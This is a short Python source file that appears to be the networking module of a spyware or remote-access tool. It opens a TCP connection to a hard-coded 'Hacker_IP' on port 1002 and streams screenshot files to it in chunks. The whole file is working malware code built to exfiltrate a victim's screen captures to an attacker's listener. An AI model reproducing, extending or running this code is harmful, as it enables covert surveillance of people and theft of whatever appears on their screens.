import socket
import os
import time

class Networking() :

	def __init__(self) :

		self.Hacker_IP = '192.168.0.155'
		self.Hacker_Port = 1002
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.client.connect((self.Hacker_IP, self.Hacker_Port))

	def SendScreenshots(self, image_data) :

		# Informing the server about size of file 
		file_size = os.path.getsize(image_data)
		self.client.send(str(file_size).encode("utf-8"))
		print(file_size)
		time.sleep(1)
		
		# Sending the image by chuncks of 2048 bytes
		self.file = open(str(image_data), 'rb')
		image_data = self.file.read(2048)

		while image_data :
			self.client.send(image_data)
			image_data = self.file.read(2048)
		self.file.close()

	def Ending(self) :
		self.file.close()
		self.client.close()
